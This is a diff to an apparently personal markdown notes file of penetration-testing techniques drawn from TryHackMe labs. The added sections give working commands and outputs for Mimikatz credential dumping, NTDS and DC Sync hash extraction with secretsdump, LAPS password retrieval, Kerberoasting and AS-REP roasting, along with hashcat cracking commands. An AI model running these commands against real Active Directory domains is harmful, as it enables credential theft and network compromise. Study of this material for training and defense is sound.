@@ -121,13 +121,6 @@ Local Windows
   - [RunAs](#RunAs)
   - [local Mimikatz2](#local-Mimikatz2)
 
-- [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-
 ------------------------------------------------------------------------------------------------
 
 - [Local Persistence](#Local-Persistence)
@@ -261,7 +254,16 @@ Active Directory
   - [Local Dumping No Credentials](#Local-Dumping-No-Credentials)
   - [Remote Dumping With Credentials](#Remote-Dumping-With-Credentials)
   - [DC Sync](#DC-Sync)
-
+- [Local Administrator Password Solution LAPS](#Local-Administrator-Password-Solution-LAPS)
+  - [Group Policy Preferences GPP](#Group-Policy-Preferences-GPP)
+  - [Local Administrator Password Solution LAPS2](#Local-Administrator-Password-Solution-LAPS2)
+  - [Enumerate for LAPS](#Enumerate-for-LAPS)
+  - [Getting the Password](#Getting-the-Password)
+- [Kerberoasting](#Kerberoasting)
+- [AS REP Roasting](#AS-REP-Roasting)
+- [SMB Relay Attack](#SMB-Relay-Attack)
+- [LLMNR NBNS Poisoning](#LLMNR-NBNS-Poisoning)
+ 
 
 
 # Its you versus them
@@ -2139,7 +2141,7 @@ Sysinternals - www.sysinternals.com
 ```
 Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
 
-### local MimiKatz
+### local MimiKatz2
 
 Mimikatz 
 ```
@@ -2334,6 +2336,27 @@ Attempting to start cmd.exe as user "THM.red\thm-local" ...
 
 
 A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.
+
+### local Mimikatz2
+Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.
+```
+C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+```
+
+
+
 
 
 ----------------------------------------------------------------------------------------------------------------------------------
@@ -5968,13 +5991,289 @@ Run the command "whoami /groups" in the new window. You should see "BUILTIN\Admi
 
 -----------------------------------------------------------------------------------------------------------------------------
 ### local Domain Controller
-
+This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
+  
 ### NTDS Domain Controller
+NTDS Domain Controller
 
+New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:
+
+    Schema table: it contains types of objects and their relationships.
+    Link table: it contains the object's attributes and their values.
+    Data type: It contains users and groups.
+
+NTDS is located in C:\Windows\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the SECURITY file system. Therefore, we must also dump the security file containing all required files to decrypt. 
+  
 ### Ntdsutil
+Ntdsutil
+
+Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as 
+
+*    Restore deleted objects in Active Directory.
+*    Perform maintenance for the AD database.
+*    Active Directory snapshot management.
+*    Set Directory Services Restore Mode (DSRM) administrator passwords.
+
+For more information about Ntdsutil, you may visit the Microsoft documentation page
+```
+https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)
+```
+
 
 ### Local Dumping No Credentials
+This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. 
 
+To successfully dump the content of the NTDS file we need the following files:
+
+*    C:\Windows\NTDS\ntds.dit
+*    C:\Windows\System32\config\SYSTEM
+*    C:\Windows\System32\config\SECURITY
+
+The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the C:\temp directory.
+```
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+Now, if we check the c:\temp directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
+```    
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local 
+```
+  
 ### Remote Dumping With Credentials
+In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.
 
+  
 ### DC Sync
+The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:
+
+*    Replicating Directory Changes
+*    Replicating Directory Changes All
+*    Replicating Directory Changes in Filtered Set
+
+An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. 
+
+```     
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.204.246 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+```
+Let's explain the command a bit more.
+
+*    the -just-dc argument is for extracting the NTDS data.
+*    the thm.red/AD_Admin_User is the authenticated domain user in the form of (domain/user).
+
+Note if we are interested to dump only the NTLM hashes, then we can use the -just-dc-ntlm argument as follows,
+
+           
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.204.246
+
+
+Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:
+```        
+user@machine$ hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
+```
+
+### Local Administrator Password Solution LAPS 
+This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.
+
+### Group Policy Preferences GPP
+A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).
+
+GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.
+  
+The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN.
+```
+https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+```
+Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword.
+```
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+```
+
+### Local Administrator Password Solution LAPS2 
+In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.
+
+The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd.
+
+![image](https://user-images.githubusercontent.com/24814781/189459047-fcbaceca-d030-49e5-9aff-db282dfaffa2.png)
+
+
+
+
+### Enumerate for LAPS
+let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the admpwd.dll path.
+```
+C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Program Files\LAPS\CSE
+
+06/06/2022  01:01 PM              .
+06/06/2022  01:01 PM              ..
+05/05/2021  07:04 AM           184,232 AdmPwd.dll
+               1 File(s)        184,232 bytes
+               2 Dir(s)  10,306,015,232 bytes free
+```
+The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,
+
+```
+PS C:\Users\thm> Get-Command *AdmPwd*
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
+Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
+Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
+```
+
+Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity *  argument to list all available OUs.
+```
+PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg
+
+ObjectDN                                      ExtendedRightHolders
+--------                                      --------------------
+OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
+```
+
+The output shows that the THMGroupReader group in THMorg has the right access to LAPS. Let's check the group and its members.
+
+```
+PS C:\Users\thm> net groups "THMGroupReader"
+Group name     THMGroupReader
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+bk-admin
+The command completed successfully.
+
+PS C:\Users\victim> net user test-admin
+User name                    test-admin
+Full Name                    THM Admin Test Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+[** Removed **]
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+                             *THMGroupReader           *Enterprise Admins
+The command completed successfully.
+```
+
+
+
+### Getting the Password
+
+We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.
+```
+PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
+
+ComputerName         DistinguishedName                             Password           ExpirationTimestamp
+------------         -----------------                             --------           -------------------
+CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
+```
+
+It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the LAPSToolkit
+```
+https://github.com/leoloobeek/LAPSToolkit
+```
+
+
+### Kerberoasting
+Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. 
+
+Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.
+```       
+user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.204.246 THM.red/thm
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+
+```
+
+The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.
+
+The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.
+
+```  
+user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.204.246 THM.red/thm -request-user svc-user 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
+```
+
+Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using -m 13100 mode as follows,
+
+```
+user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+```
+
+### AS REP Roasting
+AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!
+
+![image](https://user-images.githubusercontent.com/24814781/189459934-93f8c0c1-2bfe-49fe-8597-7ad72998219e.png)
+
+The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a users.lst list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.
+
+```
+Administrator
+admin
+thm
+test
+sshd
+victim
+CREDS-HARVESTIN$
+```
+We will be using the Impacket Get-NPUsers script this time as follows,
+
+```     
+root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.204.246 thm.red/ -usersfile /tmp/users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
+[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+We specified the IP address of the domain controller with the -dc-ip argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.
+
+Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the -format argument.
+
+### SMB Relay Attack
+The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources. 
+
+### LLMNR NBNS Poisoning
+Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.
+
+The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service.
+
+The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine. 
